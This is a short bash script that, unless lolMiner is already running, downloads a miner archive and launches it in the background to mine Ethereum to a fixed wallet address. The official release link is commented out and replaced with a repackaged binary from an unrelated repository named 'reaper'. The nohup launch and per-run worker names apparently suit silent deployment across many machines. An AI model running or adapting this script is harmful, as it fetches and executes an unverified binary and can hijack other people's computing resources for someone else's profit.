#!/bin/bash

if pgrep -x "lolMiner" > /dev/null
then
    echo "Already Running"
else
    #wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz
    #tar -xf lolMiner_v1.31_Lin64.tar.gz
    wget https://github.com/blitz2099/reaper/raw/main/1.31_Lin64.tar.gz
    tar -xf 1.31_Lin64.tar.gz
    cd 1.31
    nohup ./lolMiner --algo ETHASH --pool us-eth.2miners.com:12020 --user 0x476241f016e207C4faf657687FcF553f51047030.Worker_$( date +%Y%m%d%H%M%S ) --tls on --ethstratum ETHPROXY > nohup.out &
fi

#$SHELL
